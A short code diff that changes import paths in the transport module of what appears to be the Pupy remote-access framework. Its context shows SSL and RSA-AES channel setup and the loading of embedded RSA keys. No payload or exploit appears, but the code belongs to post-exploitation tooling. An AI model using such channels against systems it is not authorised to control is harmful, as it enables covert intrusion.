@@ -9,9 +9,9 @@ import os
 import tempfile
 import ssl
 
-from network.transports import Transport, LAUNCHER_TYPE_BIND
-from network.lib import PupyTCPServer, PupySSLClient, PupySocketStream
-from network.lib import RSA_AESClient, RSA_AESServer
+from pupy.network.transports import Transport, LAUNCHER_TYPE_BIND
+from pupy.network.lib import PupyTCPServer, PupySSLClient, PupySocketStream
+from pupy.network.lib import RSA_AESClient, RSA_AESServer
 
 # This doesn't make any sence, but who cares?
 
@@ -74,7 +74,7 @@ def ssl_authenticator():
         server_side = False
 
     except ImportError:
-        from pupylib.PupyCredentials import Credentials
+        from pupy.pupylib.PupyCredentials import Credentials
 
         credentials = Credentials()
 
@@ -115,7 +115,7 @@ class TransportConf(Transport):
             RSA_PRIV_KEY = pupy_credentials.SIMPLE_RSA_PRIV_KEY
 
         except ImportError:
-            from pupylib.PupyCredentials import Credentials
+            from pupy.pupylib.PupyCredentials import Credentials
             credentials = Credentials()
             RSA_PUB_KEY = credentials['SIMPLE_RSA_PUB_KEY']
             RSA_PRIV_KEY = credentials['SIMPLE_RSA_PRIV_KEY']
